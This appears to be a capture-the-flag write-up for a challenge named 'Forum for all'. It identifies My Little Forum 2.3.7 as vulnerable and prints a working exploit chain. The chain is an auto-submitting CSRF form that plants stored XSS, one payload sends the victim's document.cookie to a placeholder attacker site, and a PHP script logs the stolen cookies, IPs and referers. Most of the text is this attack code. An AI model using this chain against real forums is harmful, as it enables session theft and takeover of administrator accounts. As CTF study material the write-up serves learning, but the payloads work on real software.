# Forum for all

Веб-сайт:
![Site](/img/4.png)

1. Go to the forum. See that many people have already tried XSS, etc. Have a lot inputs: 4 cookies, different forms and GET requests. To force participants to poerate them all very severely.
2. At the footer of the page we see `powered by My Little Forum 2.3.7` then it is some third-party forum-script.
3. Use Google. We see that this is a vulnerable version. Go on this website https://www.exploit-db.com/exploits/40676/
4. Read about vulnerability. Try the first.
5. For CSRF and XSS is copied the form from the website and make it so that when switching on it automatically send a POST request:
````html
<form action="http://10.0.38.133:61937/index.php?mode=admin&action=edit_page" method="post" accept-charset="utf-8">
<input type="hidden" name="mode" value="admin">
<input type="hidden" name="title" value="Stored XSS 
<script>alert(1)</script>">
<input type="hidden" name="content" value="Stored XSS 
<script>alert(2)</script>">
<input type="hidden" name="menu_linkname" value="<script>var img=new Image();img.src='https://your_site/index.php?'+ encodeURI(document.cookie);</script>">
<input type="hidden" name="edit_page_submit" value="1">
<input type="submit" name="edit_page_submit" value="OK - Save page">
</form>
<body onload="document.forms[0].submit()">
````

PHP code:
````php
<?php
$text = urldecode($_SERVER['QUERY_STRING']);

if (!empty($_SERVER['HTTP_CLIENT_IP'])) 
{
	$ip=$_SERVER['HTTP_CLIENT_IP'];
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
	$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
	$ip=$_SERVER['REMOTE_ADDR'];
}
$file=fopen("file.txt", "a");
fwrite ($file, $text.PHP_EOL);
fwrite ($file, $ip.PHP_EOL);
fwrite ($file, $_SERVER['HTTP_REFERER'].PHP_EOL);
fclose($file);
?>
````

In one of the inputs write your XSS. For example, in the input menu_linkname. Write a post on the forum with your HTML page. Get cookie with the flag.